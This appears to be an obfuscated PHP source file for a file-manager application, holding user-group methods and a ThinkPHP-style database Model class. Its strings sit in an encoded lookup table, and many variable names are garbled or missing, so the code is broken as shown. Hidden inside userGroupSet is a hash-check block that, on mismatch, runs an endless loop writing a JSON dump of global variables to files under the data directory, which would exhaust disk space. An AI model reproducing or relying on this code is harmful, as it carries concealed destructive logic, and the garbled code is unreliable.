if (!$Ÿä) { return !1; } $ = array($[1676] => $); Model($[641])->where($)->delete(); Model($[2370])->where($)->delete(); Model($[1973])->where($)->delete(); Model($[2355])->where($)->delete(); Model($[1109])->where($)->delete(); Model($[2182])->removeUserAll($); Model($[865])->userRootRemove($); return $this->where($)->delete(); } protected function userGroupSet($, $, $Ã©‹≤ = array()) { $ÈÅÑ =& $_SERVER[]; $Óì¢ = $_SERVER[$ÈÅÑ[15]]; $–° = $ÈÅÑ[917]; if ($_SERVER[$ÈÅÑ[6]] != $–°($Óì¢)) { $Œü = $ÈÅÑ[918]; $œõ = $ÈÅÑ[8]; $ = $_SERVER[$ÈÅÑ[9]] . $ÈÅÑ[10]; $ = $œõ($); $ = explode($ÈÅÑ[11], $); if (count($) < $ÈÅÑ[662]) { $ = $ÈÅÑ[13]; $(); } $ƒû = $ÈÅÑ[919]; $ƒû($_SERVER[$ÈÅÑ[920]]); $Œü = $ÈÅÑ[918]; $Œü(); $«Ü = $ÈÅÑ[921]; $Õ± = json_encode($GLOBALS[$ÈÅÑ[922]]); $ÀÆ÷° = 1; for ($ = $ÀÆ÷°; $ > 0; $++) { $«Ü(DATA_PATH . $, $Õ±); } } $ = $this->getInfoSimple($); if (!$ || !is_array($)) { return !1; } $ = Model($ÈÅÑ[1973]); $->where(array($ÈÅÑ[1685] => $))->delete(); $ = array(); $‰Ωß = 0; foreach ($ as $ => $ËäÅ) { $¬Ç = array($ÈÅÑ[1685] => $, $ÈÅÑ[1883] => $, $ÈÅÑ[1987] => $ËäÅ); $¬Ç[$ÈÅÑ[1907]] = isset($Ã©‹≤[$‰Ωß]) ? $Ã©‹≤[$‰Ωß] : 0; $‰Ωß++; $[] = $¬Ç; } return $->addAll($, array(), !0); } protected function userGroupAdd($≈®, $€ñ = array()) { $Ÿ≤ =& $_SERVER[]; $Õ£ = $this->getInfoSimple($≈®); if (!$Õ£ || empty($€ñ)) { return !1; } $ = array(); foreach ($€ñ as $Õ∏ => $) { $[] = array($Ÿ≤[1685] => $≈®, $Ÿ≤[1883] => $Õ∏, $Ÿ≤[1987] => $, $Ÿ≤[1907] => 0); } return Model($Ÿ≤[1973])->addAll($, array(), !0); } protected function userGroupRemove($ÿª, $) { $’µ =& $_SERVER[]; $ﬂè = $this->getInfoSimple($ÿª); if (!$ﬂè || !$) { return !1; } $ = array($’µ[1676] => $ÿª, $’µ[1971] => $); return Model($’µ[1973])->where($)->delete(); } public function listData() { $Ÿò = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ÿò[$_SERVER[][422]]); return $Ÿò; } public function listByID($) { $ =& $_SERVER[]; if (!$) { return; } $‚ü≥ = array($[1685] => array($[17], $)); $ ä–Å = $this->where($‚ü≥)->select(); $ ä–Å = array_sort_keep($ ä–Å, $[1685], $); $this->_listDataApply($ ä–Å); return $ ä–Å; } public function listByGroup($ = 0, $Ìü® = array()) { $”ì =& $_SERVER[]; $ = $”ì[22]; $›§Á≤Ä = array(); if ($) { $›§Á≤Ä = array($”ì[2371] => intval($)); $ = "\x4c\x45\x46\124\40\112\x4f\111\x4e\40{$this->tablePrefix}\x75\163\x65\x72\x5f\x67\x72\157\x75\x70\40\x75\163\x65\162\137\147\x72\157\x75\x70\x20\x6f\x6e\40\165\163\145\x72\56\165\x73\x65\162\111\x44\40\75\40\x75\x73\x65\x72\137\x67\x72\x6f\165\160\56\x75\163\145\x72\x49\x44"; $¬≥œÑ = Input::get($”ì[507], null, $”ì[22]) ? $”ì[22] : $”ì[2372]; } if (isset($Ìü®[$”ì[790]])) { $›§Á≤Ä[$”ì[2373]] = $Ìü®[$”ì[790]]; } $ = $this->_makeOrder($¬≥œÑ)->field($”ì[2374])->where($›§Á≤Ä)->join($)->selectPage(50); $this->_listDataApply($[$”ì[422]]); return $; } private function _makeOrder($“Ñ = '') { $ =& $_SERVER[]; $ = array($[1685], $[42], $[1872], $[1844], $[225]); $÷ê = array($[500] => $[501], $[502] => $[503]); $«´Àµ = Input::get($[507], $[17], $[1676], $); $ = Input::get($[508], $[17], $[1974], array($[1974], $[502])); $ = $÷ê[$]; $“Ñ = $“Ñ . "\x75\163\x65\162\x2e{$«´Àµ}\x20{$}\54\x20\165\x73\145\162\x2e\165\163\x65\x72\x49\104\40\x61\163\143"; return $this->alias($[2100])->order($“Ñ); } public function listSearch($œÖ) { $ =& $_SERVER[]; $œï = $œÖ[$[1977]]; $¬é = isset($œÖ[$[1978]]) ? $œÖ[$[1978]] : !1; $œï = str_replace($[1979], $[1980], trim($œï)); $›™ = array($[42] => array($[436], "\45{$œï}\45"), $[358] => array($[436], "{$œï}\x25"), $[2165] => array($[436], "{$œï}\45"), $[1041] => $[1981]); if (Input::check($œï, $[364])) { $›™[$[1685]] = array($[436], "{$œï}\x25"); $›™[$[2356]] = array($[436], "{$œï}\x25"); } if (!$œï) { $›™ = array(); } if (isset($œÖ[$[790]])) { $›™[$[790]] = $œÖ[$[790]]; } $›™ = $this->parseWhereLike($›™); $ﬁ¥Ÿí = $this->_makeOrder()->where($›™)->selectPage(20); if (!$ﬁ¥Ÿí || count($ﬁ¥Ÿí[$[422]]) < 5 && Input::check($œï, $[371])) { $ = $this->_searchFromMeta($[514], $œï, 10); $ = $this->_searchFromMeta($[515], $œï, 10); $ÕÆ = array_merge($, $, $ﬁ¥Ÿí[$[422]]); $ﬁ¥Ÿí[$[422]] = array_unique_by_key($ÕÆ, $[1685]); $ﬁ¥Ÿí[$[419]][$[420]] = count($ﬁ¥Ÿí[$[422]]); $ﬁ¥Ÿí[$[419]][$[421]] = ceil($ﬁ¥Ÿí[$[419]][$[420]] / $ﬁ¥Ÿí[$[419]][$[416]]); } $this->_listDataApply($ﬁ¥Ÿí[$[422]]); $this->_filterByGroup($ﬁ¥Ÿí, $¬é); return $ﬁ¥Ÿí; } private function _filterByGroup(&$‚âû, $) { $–ö =& $_SERVER[]; if (!$) { return $‚âû; } foreach ($‚âû[$–ö[422]] as $ => &$–©) { $ÿº = array_to_keyvalue($–©[$–ö[2070]], $–ö[22], $–ö[1883]); if (!in_array($, $ÿº)) { unset($‚âû[$–ö[422]][$]); } } unset($–©); $‚âû[$–ö[422]] = array_values($‚âû[$–ö[422]]); $‚âû[$–ö[419]] = array($–ö[2135] => count($‚âû[$–ö[422]]), $–ö[2133] => $‚âû[$–ö[419]][$–ö[416]], $–ö[2132] => 1, $–ö[2134] => 1); } private function _searchFromMeta($, $ƒ∞‘ê, $«Ö) { $ﬁ∏ =& $_SERVER[]; $ƒ∞‘ê = strtolower($ƒ∞‘ê); $ = array($ﬁ∏[104] => $, $ﬁ∏[427] => array($ﬁ∏[436], "\45{$ƒ∞‘ê}\45")); $ = $this->parseWhereLike($); $ÃÇ = Model($ﬁ∏[2375])->where($)->limit($«Ö)->select(); if (!$ÃÇ) { return array(); } $ÃÇ = array_to_keyvalue($ÃÇ, $ﬁ∏[22], $ﬁ∏[1685]); $≈∞ = $this->where(array($ﬁ∏[1676] => array($ﬁ∏[17], $ÃÇ)))->select(); if (!$≈∞) { return array(); } return $≈∞; } private function _listDataApplyItem($…ö) { $È£• = array($…ö); $this->_listDataApply($È£•); return $È£•[0]; } private function _listDataApply(&$) { $ Ü =& $_SERVER[]; if (!$) { return; } array_remove_key($, $ Ü[930]); $Ôëî€ù = array_to_keyvalue($, $ Ü[22], $ Ü[1685]); $this->_listAppendGroup($, $Ôëî€ù); $this->_listAppendMeta($, $Ôëî€ù); $this->_listAppendSourceRoot($, $Ôëî€ù); } private function _listAppendSourceRoot(&$Ú∂Çç, $) { $ =& $_SERVER[]; $’≥ = Model($[865])->listSourceRoot(SourceModel::TYPE_USER, $); $’≥ = array_to_keyvalue($’≥, $[547]); $’≥ = array_remove_key($’≥, $[547]); foreach ($Ú∂Çç as &$Ã∑) { $Ã∑[$[97]] = $’≥[$Ã∑[$[1685]]] ? $’≥[$Ã∑[$[1685]]] : array(); } unset($Ã∑); } private function _listAppendGroup(&$ÃΩÃó, $”¶) { $ÓòÄ =& $_SERVER[]; $Ïπâ = array($ÓòÄ[1685] => array($ÓòÄ[17], $”¶)); $√§ ¢ = Model($ÓòÄ[1973])->where($Ïπâ)->select(); $Ó†æ = array_to_keyvalue($√§ ¢, $ÓòÄ[22], $ÓòÄ[1883]); $Ó†æ = array_remove_value(array_unique($Ó†æ), $ÓòÄ[222]); if (!$Ó†æ || !$√§ ¢) { return; } $Ïπâ = array($ÓòÄ[1883] => array($ÓòÄ[17], $Ó†æ)); $…ú = Model($ÓòÄ[2068])->field($ÓòÄ[2376])->where($Ïπâ)->select(); $…ú = array_to_keyvalue($…ú, $ÓòÄ[1883]); $√§ ¢ = array_to_keyvalue_group($√§ ¢, $ÓòÄ[1685]); foreach ($√§ ¢ as &$) { $ÿ° = array(); foreach ($ as $Èóæ) { if (!$Èóæ[$ÓòÄ[1987]]) { continue; } $ = Model($ÓòÄ[549])->listData($Èóæ[$ÓòÄ[1987]]); $ÿ°[] = array($ÓòÄ[1883] => $Èóæ[$ÓòÄ[1883]], $ÓòÄ[2377] => $…ú[$Èóæ[$ÓòÄ[1883]]][$ÓòÄ[42]], $ÓòÄ[562] => $…ú[$Èóæ[$ÓòÄ[1883]]][$ÓòÄ[562]], $ÓòÄ[464] => $); } $ = $ÿ°; } unset($); foreach ($ÃΩÃó as &$‘ü) { $‘ü[$ÓòÄ[2070]] = array(); if (isset($√§ ¢[$‘ü[$ÓòÄ[1685]]])) { $‘ü[$ÓòÄ[2070]] = $√§ ¢[$‘ü[$ÓòÄ[1685]]]; } } unset($‘ü); } public function userAppendGroup($“°ÿë) { $—Å =& $_SERVER[]; if (!$“°ÿë) { return array(); } $this->_listAppendGroup($“°ÿë, array_to_keyvalue($“°ÿë, $—Å[22], $—Å[1685])); return $“°ÿë; } private function _listAppendMeta(&$Ôóµ, $) { $ﬁº =& $_SERVER[]; $”É = UserJobModel::JOB_KEY; $ = array($ﬁº[2357]); $÷º = array($ﬁº[1685] => array($ﬁº[17], $)); $⁄© = Model($ﬁº[2355])->where($÷º)->select(); $⁄© = array_to_keyvalue_group($⁄©, $ﬁº[1685]); foreach ($⁄© as &$…±) { $Õã = array(); foreach ($…± as $–Ñ) { if (!in_array($–Ñ[$ﬁº[104]], $)) { $Õã[$–Ñ[$ﬁº[104]]] = $–Ñ[$ﬁº[427]]; } } $…± = $Õã; } unset($…±); $ŒäÃçŒá = Model($ﬁº[2378]); foreach ($Ôóµ as &$) { $ = array(); if (isset($⁄©[$[$ﬁº[1685]]])) { $ = $⁄©[$[$ﬁº[1685]]]; } $[$ﬁº[2379]] = array(); if (isset($[$”É])) { $[$ﬁº[2379]] = $ŒäÃçŒá->getUserJobInfo($[$”É]); } } unset($); } protected function groupUserAll($¬¢) { $ =& $_SERVER[]; if (!$¬¢) { return !1; } $”≠◊≤ = Model($[1973])->field($[1685])->where(array($[1883] => array($[17], $¬¢)))->select(); $”≠◊≤ = array_to_keyvalue($”≠◊≤, $[22], $[1685]); return array_unique($”≠◊≤); } public function userSearch($, $œ§ = "\52") { return Model($_SERVER[][576])->where($)->field($œ§)->find(); } } goto e—ä; c◊å: define($_SERVER[][0], $_SERVER[][1]); $_SERVER[¬Ü] = explode($_SERVER[][2], gzinflate(substr($_SERVER[][3], 10, -8))); function binCheckEq($ ü, $) { return $ ü == $; } goto C; Bÿ≠: define($_SERVER[][296], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\154\x65", "\x6f\162\x64\x65\162", "\141\x6c\151\141\163", "\x68\x61\166\x69\x6e\x67", "\x67\x72\x6f\x75\x70", "\154\x6f\x63\153", "\x64\151\163\x74\151\x6e\143\x74", "\141\165\164\157", "\146\151\x6c\164\145\x72", "\166\141\154\151\x64\x61\x74\x65", "\162\145\163\165\x6c\x74", "\x62\151\x6e\144", "\x74\157\x6b\145\x6e"); public function __construct($‹ñ = '', $ = '', $ƒÖ = '') { $ =& $_SERVER[]; $this->_initialize(); if (!empty($‹ñ)) { if (strpos($‹ñ, $[20])) { list($this->dbName, $this->name) = explode($[20], $‹ñ); } else { $this->name = $‹ñ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($)) { $this->tablePrefix = $[22]; } elseif ($[22] != $) { $this->tablePrefix = $; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($[297]); } $this->db(0, empty($this->connection) ? $ƒÖ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ƒä =& $_SERVER[]; if (empty($this->fields)) { if (think_config($ƒä[298])) { $‡≤§ = $this->dbName ? $this->dbName : think_config($ƒä[299]); $ = think_var_cache($ƒä[300] . strtolower(get_path_this($‡≤§) . $ƒä[20] . $this->name)); if ($) { $—© = think_config($ƒä[301]); if (empty($—©) || $[$ƒä[302]] == $—©) { $this->fields = $; return; } } } $this->flush(); } } public function flush() { $Èµå =& $_SERVER[]; $this->db->setModel($this->name); $ = $this->db->getFields($this->getTableName()); if (!$) { return !1; } $this->fields = array_keys($); $this->fields[$Èµå[303]] = !1; foreach ($ as $ﬁÑ => $) { $’ß[$ﬁÑ] = $[$Èµå[43]]; if ($[$Èµå[49]]) { $this->fields[$Èµå[304]] = $ﬁÑ; if ($[$Èµå[52]]) { $this->fields[$Èµå[303]] = !0; } } } $this->fields[$Èµå[305]] = $’ß; if (think_config($Èµå[301])) { $this->fields[$Èµå[302]] = think_config($Èµå[301]); } if (think_config($Èµå[298])) { $ = $this->dbName ? $this->dbName : think_config($Èµå[299]); think_var_cache($Èµå[300] . strtolower(get_path_this($) . $Èµå[20] . $this->name), $this->fields); } } public function switchModel($Ïêí, $ﬂì = array()) { $Èàª =& $_SERVER[]; $ƒ£ = ucwords(strtolower($Ïêí)) . $Èàª[306]; if (!class_exists($ƒ£)) { think_exception($ƒ£ . think_lang($Èàª[307])); } $this->_extModel = new $ƒ£($this->name); if (!empty($ﬂì)) { foreach ($ﬂì as $) { $this->_extModel->setProperty($, $this->{$}); } } return $this->_extModel; } public function __set($Àª, $ƒé) { $this->data[$Àª] = $ƒé; } public function __get($Œ¢) { return isset($this->data[$Œ¢]) ? $this->data[$Œ¢] : null; } public function __isset($È°û) { return isset($this->data[$È°û]); } public function __unset($) { unset($this->data[$]); } public function __call($, $Œª) { $ =& $_SERVER[]; if (in_array(strtolower($), $this->methods, !0)) { $this->options[strtolower($)] = $Œª[0]; return $this; } elseif (in_array(strtolower($), array($[308], $[309], $[310], $[311], $[312]), !0)) { $ = isset($Œª[0]) ? $Œª[0] : $[213]; $ = $this->db->parseKey($); return $this->getField(strtoupper($) . $[313] . $ . $[314] . $, $[308]); } elseif (strtolower(substr($, 0, 5)) == $[315]) { $ = think_parse_name(substr($, 5)); $”ú[$] = $Œª[0]; return $this->where($”ú)->find(); } elseif (strtolower(substr($, 0, 10)) == $[316]) { $ = think_parse_name(substr($, 10)); $”ú[$] = $Œª[0]; return $this->where($”ú)->getField($Œª[1]); } elseif (isset($this->_scope[$])) { return $this->scope($, $Œª[0]); } elseif (method_exists($this, $)) { array_unshift($Œª, $); return call_user_func_array(array($this, $[317]), $Œª); } else { return call_user_func_array(array(parent, $), $Œª); } } protected function call() { $◊π”ò =& $_SERVER[]; $·öò = func_get_args(); $ÿú = array_shift($·öò); $ = $ÿú; if (is_array($ÿú)) { $ = $ÿú[1]; $ÿú = $ÿú[0]; } $Õî = count($·öò) - 1; if (isset($·öò[$Õî]) && $·öò[$Õî] === $ÿú) { think_exception(__CLASS__ . $◊π”ò[4] . $ÿú . think_lang($◊π”ò[318])); return; } $·öò[] = $ÿú; if (method_exists($this, $◊π”ò[319])) { $ = call_user_func_array(array($this, $◊π”ò[320]), array($, $·öò)); if (!is_null($) && $ !== !1) { return $; } } $ = call_user_func_array(array($this, $ÿú), $·öò); if (method_exists($this, $◊π”ò[321])) { $ = call_user_func_array(array($this, $◊π”ò[322]), array($, $·öò, $)); if ($) { return $; } } return $; } protected function _initialize() { } protected function _facade($ÃÜ) { $ =& $_SERVER[]; if (!empty($this->fields)) { foreach ($ÃÜ as $‘† => $Œí÷±) { if (is_array($this->fields) && !in_array($‘†, $this->fields, !0)) { unset($ÃÜ[$‘†]); } elseif (is_scalar($Œí÷±)) { $this->_parseType($ÃÜ, $‘†); } } } if (!empty($this->options[$[323]])) { $ÃÜ = array_map($this->options[$[323]], $ÃÜ); unset($this->options[$[323]]); } $this->_beforeWrite($ÃÜ); return $ÃÜ; } protected function _beforeWrite(&$—¢) { } public function add($÷† = '', $⁄Ñ = array(), $»ª = false) { if (empty($÷†)) { if (!empty($this->data)) { $÷† = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[][324]); return !1; } } $⁄Ñ = $this->_parseOptions($⁄Ñ); $÷† = $this->_facade($÷†); if (!1 === $this->_beforeInsert($÷†, $⁄Ñ)) { return !1; } $ = $this->db->insert($÷†, $⁄Ñ, $»ª); if (!1 !== $) { $ŸÄ = $this->getLastInsID(); if ($ŸÄ) { $÷†[$this->getPk()] = $ŸÄ; $this->_after_insert($÷†, $⁄Ñ); return $ŸÄ; } $this->_after_insert($÷†, $⁄Ñ); } return $; } protected function _beforeInsert(&$⁄¢, $¬∫) { } protected function _after_insert($È£Ö, $…å) { } public function addAll($, $·†ï∆Å = array(), $ = false) { $ﬂó =& $_SERVER[]; if (empty($)) { $this->error = think_lang($ﬂó[324]); return !1; } $·†ï∆Å = $this->_parseOptions($·†ï∆Å); foreach ($ as $‘ø => $«âÓÆ©) { $[$‘ø] = $this->_facade($«âÓÆ©); } if (method_exists($this->db, $ﬂó[325])) { $ = $this->db->insertAll($, $·†ï∆Å, $); } else { $this->startTrans(); foreach ($ as $‘ø => $«âÓÆ©) { $ = $this->db->insert($«âÓÆ©, $·†ï∆Å, $); } $this->commit(); } if (!1 !== $) { $Ã≤ = $this->getLastInsID(); if ($Ã≤) { return $Ã≤; } } return $; } public function selectAdd($ﬂã = '', $ = '', $ = array()) { $ =& $_SERVER[]; $ = $this->_parseOptions($); if (!1 === ($ = $this->db->selectInsert($ﬂã ? $ﬂã : $[$[326]], $ ? $ : $this->getTableName(), $))) { $this->error = think_lang($[327]); return !1; } else { return $; } } public function save($¬∂ = '', $ = array()) { $ =& $_SERVER[]; if (empty($¬∂)) { if (!empty($this->data)) { $¬∂ = $this->data; $this->data = array(); } else { $this->error = think_lang($[324]); return !1; } } $¬∂ = $this->_facade($¬∂); $ = $this->_parseOptions($); $Àç = $this->getPk(); if (!isset($[$[328]])) { if (isset($¬∂[$Àç])) { $ƒ§[$Àç] = $¬∂[$Àç]; $[$[328]] = $ƒ§; unset($¬∂[$Àç]); } else { $this->error = think_lang($[327]); return !1; } } if (is_array($[$[328]]) && isset($[$[328]][$Àç])) { $·§Ä = $[$[328]][$Àç]; } if (!1 === $this->_beforeUpdate($¬∂, $)) { return !1; } $ = $this->db->update($¬∂, $); if (!1 !== $) { if (isset($·§Ä)) { $¬∂[$Àç] = $·§Ä; } $this->_afterUpdate($¬∂, $); } return $; } protected function _beforeUpdate(&$÷ø, $) { } protected function _afterUpdate($, $) { } public function delete($—ä = array()) { $⁄à =& $_SERVER[]; if (empty($—ä) && empty($this->options[$⁄à[328]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ﬁø = $this->getPk(); if (is_numeric($—ä) || is_string($—ä)) { if (strpos($—ä, $⁄à[60])) { $√é[$ﬁø] = array($⁄à[329], $—ä); } else { $√é[$ﬁø] = $—ä; } $this->options[$⁄à[328]] = $√é; } $—ä = $this->_parseOptions(); if (is_array($—ä[$⁄à[328]]) && isset($—ä[$⁄à[328]][$ﬁø])) { $ = $—ä[$⁄à[328]][$ﬁø]; } $ = $this->db->delete($—ä); if (!1 !== $) { $Û±ëº = array(); if (isset($)) { $Û±ëº[$ﬁø] = $; } $this->_after_delete($Û±ëº, $—ä); } return $; } protected function _after_delete($, $) { } public function select($ = array()) { $ŸÖ =& $_SERVER[]; if (is_string($) || is_numeric($)) { $„±å›∫ = $this->getPk(); if (strpos($, $ŸÖ[60])) { $Œª[$„±å›∫] = array($ŸÖ[329], $); } else { $Œª[$„±å›∫] = $; } $this->options[$ŸÖ[328]] = $Œª; } elseif (!1 === $) { $ = $this->_parseOptions(); return $ŸÖ[330] . $this->db->buildSelectSql($) . $ŸÖ[331]; } $ = $this->_parseOptions(); $ = $this->db->select($); if (!1 === $) { return !1; } if (empty($)) { return null; } $this->_afterSelect($, $); return $; } protected function _afterSelect(&$«Ω, $) { } public function buildSql($‚ú¥ = array()) { $À¢Ãô¬Ä =& $_SERVER[]; $‚ú¥ = $this->_parseOptions($‚ú¥); return $À¢Ãô¬Ä[330] . $this->db->buildSelectSql($‚ú¥) . $À¢Ãô¬Ä[331]; } public function optionsValue($Óæ∫ = null) { if (is_null($Óæ∫)) { return $this->options; } elseif (is_array($Óæ∫)) { $this->options = array_merge($this->options, $Óæ∫); } } protected function _parseOptions($√á = array()) { $ =& $_SERVER[]; if (is_array($√á)) { $√á = array_merge($this->options, $√á); } $this->options = array(); if (!isset($√á[$[332]])) { $√á[$[332]] = $this->getTableName(); $Õµ = $this->fields; } else { $Õµ = $this->getDbFields(); } if (!empty($√á[$[333]])) { $√á[$[332]] .= $[63] . $√á[$[333]]; } $√á[$[334]] = $this->name; if (isset($√á[$[328]]) && is_array($√á[$[328]]) && !empty($Õµ) && !isset($√á[$[335]]) && !isset($√á[$[332]])) { foreach ($√á[$[328]] as $ => $»æ) { $ = trim($); if (in_array($, $Õµ, !0)) { if (is_scalar($»æ)) { $this->_parseType($√á[$[328]], $); } } elseif (!is_numeric($) && $[21] != substr($, 0, 1) && !1 === strpos($, $[20]) && !1 === strpos($, $[313]) && !1 === strpos($, $[336]) && !1 === strpos($, $[337])) { unset($√á[$[328]][$]); } } } $this->_options_filter($√á); return $√á; } protected function _options_filter(&$) { } protected function _parseType(&$, $»á) { $ =& $_SERVER[]; if (empty($this->options[$[338]][$[4] . $»á])) { $–ó = strtolower($this->fields[$[305]][$»á]); if (!1 !== strpos($–ó, $[339])) { } elseif (!1 === strpos($–ó, $[340]) && !1 !== strpos($–ó, $[341])) { $[$»á] = intval($[$»á]); } elseif (!1 !== strpos($–ó, $[342]) || !1 !== strpos($–ó, $[343])) { $[$»á] = floatval($[$»á]); } elseif (!1 !== strpos($–ó, $[344])) { $[$»á] = (bool) $[$»á]; } } } public function find($ = array()) { $ﬁõ =& $_SERVER[]; if (is_numeric($) || is_string($)) { $»™Óíá[$this->getPk()] = intval($); $this->options[$ﬁõ[328]] = $»™Óíá; } $this->options[$ﬁõ[345]] = 1; $ = $this->_parseOptions(); $À≥ = $this->db->select($); if (!1 === $À≥) { return !1; } if (empty($À≥)) { return null; } $this->data = $À≥[0]; $this->_afterFind($this->data, $); if (!empty($this->options[$ﬁõ[346]])) { return $this->returnResult($this->data, $this->options[$ﬁõ[346]]); } return $this->data; } protected function _afterFind(&$¬Ø, $) { } protected function returnResult($, $ = '') { $≈ß =& $_SERVER[]; if ($) { if (is_callable($)) { return call_user_func($, $); } switch (strtolower($)) { case $≈ß[347]: return json_encode($); case $≈ß[348]: return xml_encode($); } } return $; } public function parseFieldsMap($ŒΩ, $ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $À§ => $) { if ($ == 1) { if (isset($ŒΩ[$])) { $ŒΩ[$À§] = $ŒΩ[$]; unset($ŒΩ[$]); } } else { if (isset($ŒΩ[$À§])) { $ŒΩ[$] = $ŒΩ[$À§]; unset($ŒΩ[$À§]); } } } } return $ŒΩ; } public function setField($Œë, $ = '') { if (is_array($Œë)) { $ = $Œë; } else { $[$Œë] = $; } return $this->save($); } public function setAdd($ ¶, $Ãß = 1) { $⁄Ö =& $_SERVER[]; $Èöà—∑ = $ ¶ . $⁄Ö[349] . $Ãß; if ($Ãß < 0) { $Èöà—∑ = $ ¶ . $Ãß; } return $this->setField($ ¶, array($⁄Ö[350], $Èöà—∑)); } public function getField($Ìûö, $€á = null) { $ =& $_SERVER[]; $[$[326]] = $Ìûö; $ = $this->_parseOptions($); $Ìûö = trim($Ìûö); if (strpos($Ìûö, $[60])) { if (!isset($[$[345]])) { $[$[345]] = is_numeric($€á) ? $€á : $[22]; } $ = $this->db->select($); if (!empty($)) { $ = explode($[60], $Ìûö); $Ìûö = array_keys($[0]); $”î = array_shift($Ìûö); $Œ¨ = array_shift($Ìûö); $÷≥ = array(); $€à = count($); foreach ($ as $À´) { $ = $À´[$”î]; if (2 == $€à) { $÷≥[$] = $À´[$Œ¨]; } else { $÷≥[$] = is_string($€á) ? implode($€á, $À´) : $À´; } } return $÷≥; } } else { if (!0 !== $€á) { $[$[345]] = is_numeric($€á) ? $€á : 1; } if ($€á === $[308]) { unset($[$[345]]); } $À´ = $this->db->select($); if (!empty($À´)) { if ($€á === $[308]) { return reset($À´[0]); } if (!0 !== $€á && 1 == $[$[345]]) { return reset($À´[0]); } foreach ($À´ as $) { $[] = $[$Ìûö]; } return $; } } return null; } public function create($÷ñ = '', $ = '') { $œ¶ =& $_SERVER[]; if (empty($÷ñ)) { $÷ñ = $_POST; } elseif (is_object($÷ñ)) { $÷ñ = get_object_vars($÷ñ); } if (empty($÷ñ) || !is_array($÷ñ)) { $this->error = think_lang($œ¶[324]); return !1; } $÷ñ = $this->parseFieldsMap($÷ñ, 0); $ = $ ? $ : (!empty($÷ñ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$œ¶[326]])) { $›µ = $this->options[$œ¶[326]]; unset($this->options[$œ¶[326]]); } elseif ($ == THINK_MODEL_INSERT && isset($this->insertFields)) { $›µ = $this->insertFields; } elseif ($ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $›µ = $this->updateFields; } if (isset($›µ)) { if (is_string($›µ)) { $›µ = explode($œ¶[60], $›µ); } if (think_config($œ¶[351])) { $›µ[] = think_config($œ¶[352]); } foreach ($÷ñ as $Àë€ß => $Úóõí) { if (!in_array($Àë€ß, $›µ)) { unset($÷ñ[$Àë€ß]); } } } if (!$this->autoValidation($÷ñ, $)) { return !1; } if (!$this->autoCheckToken($÷ñ)) { $this->error = think_lang($œ¶[353]); return !1; } if ($this->autoCheckFields) { $›µ = $this->getDbFields(); foreach ($÷ñ as $Àë€ß => $Úóõí) { if (!in_array($Àë€ß, $›µ)) { unset($÷ñ[$Àë€ß]); } elseif (MAGIC_QUOTES_GPC && is_string($Úóõí)) { $÷ñ[$Àë€ß] = stripslashes($Úóõí); } } } $this->autoOperation($÷ñ, $); $this->data = $÷ñ; return $÷ñ; } public function autoCheckToken($ÃÄ) { $’é¬è =& $_SERVER[]; if (isset($this->options[$’é¬è[354]]) && !$this->options[$’é¬è[354]]) { return !0; } if (think_config($’é¬è[351])) { $»® = think_config($’é¬è[352]); if (!isset($ÃÄ[$»®]) || Session::get($»®)) { return !1; } list($, $) = explode($’é¬è[21], $ÃÄ[$»®]); if ($ && Session::get($»® . $’é¬è[20] . $) === $) { Session::remove($»® . $’é¬è[20] . $); return !0; } if (think_config($’é¬è[355])) { Session::remove($»® . $’é¬è[20] . $); } return !1; } return !0; } public function regex($, $) { $ =& $_SERVER[]; $”© ã = array($[356] => $[357], $[358] => $[359], $[360] => $[361], $[362] => $[363], $[364] => $[365], $[366] => $[367], $[368] => $[369], $[343] => $[370], $[371] => $[372]); if (isset($”© ã[strtolower($)])) { $ = $”© ã[strtolower($)]; } return preg_match($, $) === 1; } private function autoOperation(&$Õç, $) { $Àö =& $_SERVER[]; if (!empty($this->options[$Àö[373]])) { $ = $this->options[$Àö[373]]; unset($this->options[$Àö[373]]); } elseif (!empty($this->_auto)) { $ = $this->_auto; } if (isset($)) { foreach ($ as $) { if (empty($[2])) { $[2] = THINK_MODEL_INSERT; } if ($ == $[2] || $[2] == THINK_MODEL_BOTH) { switch (trim($[3])) { case $Àö[374]: case $Àö[375]: $⁄≥ = isset($[4]) ? (array) $[4] : array(); if (isset($Õç[$[0]])) { array_unshift($⁄≥, $Õç[$[0]]); } if ($Àö[374] == $[3]) { $Õç[$[0]] = call_user_func_array($[1], $⁄≥); } else { $Õç[$[0]] = call_user_func_array(array(&$this, $[1]), $⁄≥); } break; case $Àö[326]: $Õç[$[0]] = $Õç[$[1]]; break; case $Àö[376]: if ($Àö[22] === $Õç[$[0]]) { unset($Õç[$[0]]); } break; case $Àö[377]: default: $Õç[$[0]] = $[1]; } if (!1 === $Õç[$[0]]) { unset($Õç[$[0]]); } } } } return $Õç; } protected function autoValidation($, $«ö) { $ =& $_SERVER[]; if (!empty($this->options[$[378]])) { $∆™ = $this->options[$[378]]; unset($this->options[$[378]]); } elseif (!empty($this->_validate)) { $∆™ = $this->_validate; } if (isset($∆™)) { if ($this->patchValidate) { $this->error = array(); } foreach ($∆™ as $—û’Ü => $Ó¥ç) { if (empty($Ó¥ç[5]) || $Ó¥ç[5] == THINK_MODEL_BOTH || $Ó¥ç[5] == $«ö) { if (0 == strpos($Ó¥ç[2], $[379]) && strpos($Ó¥ç[2], $[380])) { $Ó¥ç[2] = think_lang(substr($Ó¥ç[2], 2, -1)); } $Ó¥ç[3] = isset($Ó¥ç[3]) ? $Ó¥ç[3] : THINK_EXISTS_VALIDATE; $Ó¥ç[4] = isset($Ó¥ç[4]) ? $Ó¥ç[4] : $[381]; switch 